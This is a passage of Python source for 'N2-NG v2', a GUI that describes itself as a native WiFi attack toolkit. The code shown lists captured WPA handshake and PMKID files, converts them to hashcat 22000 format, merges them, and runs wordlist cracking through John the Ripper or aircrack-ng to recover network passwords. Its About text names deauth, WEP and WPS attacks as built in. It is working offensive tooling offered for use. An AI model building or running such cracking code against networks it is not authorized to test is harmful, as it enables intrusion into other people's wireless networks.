            set_managed_mode(attack_mon, restore_mac=attack_perm_mac)

        if authorized():
            return f"AUTHORIZED handshake captured -> {out_file}"
        return "stopped or exhausted rounds, no AUTHORIZED handshake"

    # ------------------------------------------------------------------
    # Captures tab
    # ------------------------------------------------------------------
    def _capture_files(self):
        from pathlib import Path

        root = Path(self.capture_dir_var.get())
        if not root.exists():
            return []
        suffixes = {".cap", ".pcap", ".pcapng", ".22000"}
        return sorted((p for p in root.rglob("*") if p.is_file() and p.suffix.lower() in suffixes),
                      key=lambda p: p.stat().st_mtime, reverse=True)

    def _refresh_captures(self):
        self.capture_tree.delete(*self.capture_tree.get_children())
        for path in self._capture_files():
            size = path.stat().st_size
            size_str = f"{size} B" if size < 1024 else f"{size / 1024:.1f} KB" if size < 1024 ** 2 else f"{size / 1024 ** 2:.1f} MB"
            kind = "hash" if path.suffix.lower() == ".22000" else "capture"
            self.capture_tree.insert("", tk.END, iid=str(path), values=(path.name, kind, size_str, str(path)))

    def _selected_capture_paths(self) -> list[str]:
        return list(self.capture_tree.selection())

    def _on_capture_right_click(self, event):
        row = self.capture_tree.identify_row(event.y)
        if not row:
            return
        if row not in self.capture_tree.selection():
            self.capture_tree.selection_set(row)
        self._capture_copy_path()

    def _capture_copy_path(self):
        paths = self._selected_capture_paths()
        if not paths:
            messagebox.showwarning("N2-NG v2", "Select a capture first.")
            return
        self.root.clipboard_clear()
        self.root.clipboard_append("\n".join(paths))
        self.status_var.set(f"Copied {len(paths)} path(s) to clipboard")

    def _capture_inspect(self):
        paths = self._selected_capture_paths()
        if not paths:
            messagebox.showwarning("N2-NG v2", "Select a capture first.")
            return

        def work():
            from pathlib import Path

            lines = []
            for p in paths:
                path = Path(p)
                if path.suffix.lower() == ".22000":
                    text = path.read_text()
                    pmkid = sum(1 for line in text.splitlines() if line.startswith("WPA*01*"))
                    hs = sum(1 for line in text.splitlines() if line.startswith("WPA*02*"))
                    lines.append(f"{path.name}: {pmkid} PMKID line(s), {hs} handshake line(s)")
                else:
                    lines.append(f"{path.name}: {self._inspect_capture(path)}")
            self._queue.put(("info", "\n".join(lines)))
            return "inspected"

        self._run_bg("Inspect capture(s)", work)

    def _inspect_capture(self, path) -> str:
        from scapy.utils import rdpcap

        from ..attacks.handshake import HandshakeCapture, _classify
        from ..attacks.pmkid import extract_pmkid
        from ..frames import is_eapol

        try:
            packets = rdpcap(str(path))
        except Exception as exc:
            return f"could not parse ({exc})"
        cap = HandshakeCapture()
        pmkid_found = False
        for pkt in packets:
            if is_eapol(pkt):
                if extract_pmkid(bytes(pkt)):
                    pmkid_found = True
            msg_no = _classify(pkt)
            if msg_no is not None and getattr(pkt, "addr3", None) and getattr(pkt, "addr1", None):
                ap, client = pkt.addr3, pkt.addr1 if msg_no % 2 == 1 else pkt.addr2
                cap.add(ap, client, msg_no)
        statuses = [cap.status(a, c).value for a, c in cap.messages]
        parts = [f"{len(packets)} packets"]
        if pmkid_found:
            parts.append("PMKID present")
        if statuses:
            parts.append(f"handshake pairs={statuses}")
        if not pmkid_found and not statuses:
            parts.append("no PMKID/handshake material found")
        return ", ".join(parts)

    def _capture_convert(self):
        paths = self._selected_capture_paths()
        if not paths:
            messagebox.showwarning("N2-NG v2", "Select a .cap/.pcap/.pcapng file first.")
            return
        from ..crack.convert import cap_to_22000

        def work():
            results = []
            for p in paths:
                out = p + ".22000"
                cap_to_22000(p, out)
                results.append(out)
            self._queue.put(("info", "Converted:\n" + "\n".join(results)))
            self._queue.put(("status", "Ready."))
            self.root.after(0, self._refresh_captures)
            return "converted"

        self._run_bg("Convert to 22000", work)

    def _capture_fix(self):
        paths = self._selected_capture_paths()
        if not paths:
            messagebox.showwarning("N2-NG v2", "Select a capture to fix first.")
            return
        from ..crack.convert import fix_capture

        def work():
            outputs = [fix_capture(p) for p in paths]
            self._queue.put(("info", "Fixed:\n" + "\n".join(outputs)))
            self.root.after(0, self._refresh_captures)
            return "fixed"

        self._run_bg("Fix capture(s)", work)

    def _capture_merge(self):
        paths = self._selected_capture_paths()
        if len(paths) < 2:
            messagebox.showwarning("N2-NG v2", "Select at least two captures to merge.")
            return
        from ..crack.convert import merge_captures

        def work():
            out = merge_captures(paths)
            self._queue.put(("info", f"Merged into:\n{out}"))
            self.root.after(0, self._refresh_captures)
            return out

        self._run_bg("Merge captures", work)

    def _open_crack_dialog(self):
        CrackDialog(self.root, self.fonts, self.capture_dir_var.get(), self.wordlist_var.get())

    def _capture_crack(self):
        """Crack the selected file(s): .22000 -> John, .cap/.pcap/.pcapng ->
        aircrack-ng (simpler for a single known target, per user request —
        needs a BSSID, derived from the target folder name)."""
        selected = self._selected_capture_paths()
        hash_paths = [p for p in selected if p.endswith(".22000")]
        cap_paths = [p for p in selected if p.lower().endswith((".cap", ".pcap", ".pcapng"))]
        if not hash_paths and not cap_paths:
            messagebox.showwarning("N2-NG v2", "Select one or more .22000 hash files or capture files first.")
            return
        wordlist = self.wordlist_var.get()
        if not wordlist:
            messagebox.showwarning("N2-NG v2", "Set a wordlist first (File > Set Wordlist).")
            return

        if hash_paths:
            self._crack_with_john(hash_paths, wordlist)
        else:
            self._crack_with_aircrack(cap_paths, wordlist)

    def _crack_with_john(self, paths: list[str], wordlist: str):
        from ..crack.convert import merge_22000_files
        from ..crack.john import JohnCracker, JohnUnavailableError

        def work():
            from pathlib import Path

            hashfile = paths[0]
            if len(paths) > 1:
                merged_lines = merge_22000_files(paths)
                hashfile = str(Path(self.capture_dir_var.get()) / "merged_batch.22000")
                Path(hashfile).write_text("\n".join(merged_lines) + "\n")
            try:
                cracker = JohnCracker()
            except JohnUnavailableError as exc:
                return str(exc)
            results = cracker.crack(hashfile, wordlist)
            if not results:
                return "no passwords recovered"
            self._queue.put(("info", "\n".join(f"{k}: {v}" for k, v in results.items())))
            return f"{len(results)} recovered"

        self._run_bg("Crack with John", work)

    def _crack_with_aircrack(self, paths: list[str], wordlist: str):
        import re
        from pathlib import Path

        from ..crack.aircrack import AirCracker, AircrackUnavailableError
        from ..crack.convert import merge_captures

        bssid_match = re.search(r"([0-9A-Fa-f]{2}(?:-[0-9A-Fa-f]{2}){5})$", Path(paths[0]).parent.name)
        if not bssid_match:
            messagebox.showwarning(
                "N2-NG v2",
                "Couldn't determine the BSSID from this file's folder name — aircrack-ng needs one "
                "to avoid its interactive network picker. Use 'Crack Handshakes (folder)...' instead, "
                "which lets you type a BSSID directly.",
            )
            return
        bssid = bssid_match.group(1).replace("-", ":").lower()

        def work():
            capfile = paths[0] if len(paths) == 1 else merge_captures(paths)
            try:
                cracker = AirCracker(bssid)
            except AircrackUnavailableError as exc:
                return str(exc)
            results = cracker.crack(capfile, wordlist)
            if not results:
                return "no password recovered"
            self._queue.put(("info", "\n".join(f"{k}: {v}" for k, v in results.items())))
            return f"cracked: {results.get(bssid)}"

        self._run_bg(f"Crack with aircrack-ng ({bssid})", work)

    def _capture_cleanup(self):
        """Preview then run housekeeping.cleanup_handshakes — merges each
        target's captures/hashes down to one file, then all targets into
        one master, deleting originals only after each merge is written.
        Destructive, so this always previews (dry_run) before asking."""
        from ..housekeeping import cleanup_handshakes

        plan = cleanup_handshakes(dry_run=True)
        if not plan.targets:
            messagebox.showinfo("N2-NG v2", "No target folders with captures to clean up.")
            return
        total_caps = sum(len(t.cap_files) for t in plan.targets)
        total_hashes = sum(len(t.hash_files) for t in plan.targets)
        preview = (
            f"{len(plan.targets)} target folder(s), {total_caps} capture file(s) + "
            f"{total_hashes} hash file(s) total.\n\n"
            "This will:\n"
            "  1. Merge each target's own captures/hashes into one file\n"
            "  2. Merge all targets together into one master capture + one master hash file\n"
            "  3. DELETE every original file once it's safely folded into the merged output\n"
            "  4. Remove any target folder left empty afterward\n\n"
            "This cannot be undone. Continue?"
        )
        if not messagebox.askokcancel("Cleanup Handshakes", preview):
            return

        def work():
            report = cleanup_handshakes(dry_run=False)
            self._queue.put(("info", report.summary()))
            self.root.after(0, self._refresh_captures)
            return f"{len(report.deleted)} file(s) deleted, {len(report.removed_dirs)} folder(s) removed"

        self._run_bg("Cleanup handshakes", work)

    # ------------------------------------------------------------------
    # Misc
    # ------------------------------------------------------------------
    def _choose_wordlist(self):
        path = filedialog.askopenfilename(title="Select wordlist")
        if path:
            self.wordlist_var.set(path)

    def _choose_capture_dir(self):
        path = filedialog.askdirectory(title="Select capture folder")
        if path:
            self.capture_dir_var.set(path)
            self._refresh_captures()

    def _check_dependencies(self, *, startup: bool = False):
        from ..deps import check_all, missing_required

        statuses = check_all()
        missing = missing_required(statuses)
        if startup:
            # Quiet by default — only interrupt if something REQUIRED is
            # missing (app is largely nonfunctional without it). Optional
            # tools just get a one-line log summary instead of a modal
            # every single launch, unlike v1's always-shown checker window.
            opt_missing = [s.name for s in statuses if not s.required and not s.found]
            if opt_missing:
                self._log(f"optional tools not found (some Captures actions disabled): {', '.join(opt_missing)}")
            else:
                self._log("all optional tools found")
            if missing:
                names = ", ".join(s.name for s in missing)
                messagebox.showwarning(
                    "N2-NG v2",
                    f"Required tool(s) missing: {names}\n\nMonitor mode/scanning will fail until these are installed.",
                )
            return

        lines = ["Required:"]
        for s in statuses:
            if not s.required:
                continue
            mark = "✓" if s.found else "✗ MISSING"
            lines.append(f"  {mark}  {s.name} — {s.feature}" + ("" if s.found else f"  ({s.apt})"))
        lines.append("\nOptional (gates one Captures action each):")
        for s in statuses:
            if s.required:
                continue
            mark = "✓" if s.found else "✗ missing"
            lines.append(f"  {mark}  {s.name} — {s.feature}" + ("" if s.found else f"  ({s.apt})"))
        messagebox.showinfo("Dependencies", "\n".join(lines))

    def _show_about(self):
        messagebox.showinfo(
            "About N2-NG v2",
            f"N2-NG v2 — {__version__}\n\n"
            "Native Python WiFi attack toolkit. No airodump-ng/aireplay-ng/"
            "reaver/hashcat wrapping for attack logic — scan/deauth/PMKID/"
            "handshake/WEP/WPS are this project's own implementations.\n\n"
            "Local-use tool. See STATUS.md for current feature status.",
        )

    def _load_demo_data(self):
        self.aps = {
            "22:87:ec:67:42:b1": AccessPoint(
                bssid="22:87:ec:67:42:b1", ssid="Indepentester", channel=1,
                security="WPA2", pmf="none", signal=-42, clients={"aa:bb:cc:dd:ee:01"},
            ),
            "de:ad:be:ef:00:01": AccessPoint(
                bssid="de:ad:be:ef:00:01", ssid="ExampleNet-5G", channel=44,
                security="WPA3", pmf="required", signal=-61, clients=set(),
            ),
            "de:ad:be:ef:00:02": AccessPoint(
                bssid="de:ad:be:ef:00:02", ssid=None, channel=6,
                security="open", pmf="none", signal=-70, clients={"11:22:33:44:55:66", "11:22:33:44:55:67"},
            ),
        }
        self.mon_iface = "wlan0mon (demo)"
        self.own_mac = "de:ad:be:ef:ff:ff"
        self.mac_var.set(self.own_mac)
        self.monitor_status_var.set(f"MONITOR: {self.mon_iface}")
        self.monitor_pill.configure(bg=self.THEME["accent"], fg=self.THEME["accent_text"])
        self._render_targets()
        self.tree.selection_set("22:87:ec:67:42:b1")
        self._on_target_select()
        import random

        random.seed(42)
        val = -42
        for _ in range(30):
            val += random.randint(-6, 6)
            self.signal_graph.add_sample(val)
        self._log("demo data loaded — no hardware touched")

    def _save_settings(self):
        self.settings.set("wordlist", self.wordlist_var.get())
        self.settings.set("capture_dir", self.capture_dir_var.get())
        self.settings.set("adapter", self.adapter_var.get())
        self.settings.set("iface_ap", self.iface_ap_var.get())
        self.settings.set("security_filter", self.security_filter_var.get())
        self.settings.set("randomize_mac", self.randomize_mac_var.get())
        self.settings.set("sort_col", self._sort_col)
        self.settings.set("sort_reverse", self._sort_reverse)
        self.settings.set("hidden_columns", sorted(self.hidden_columns))
        try:
            self.settings.save()
        except OSError as exc:
            self._log(f"could not save settings: {exc}")

    def _on_close(self):
        self._scanning.clear()
        self._stop_event.set()
        self._save_settings()
        if self.mon_iface and "demo" not in self.mon_iface:
            try:
                from ..radio import set_managed_mode

                set_managed_mode(self.mon_iface, restore_mac=self._permanent_mac)
            except Exception:
                pass
        self.root.destroy()


def main(demo: bool = False) -> int:
    root = tk.Tk()
    App(root, demo=demo)
    root.mainloop()
    return 0
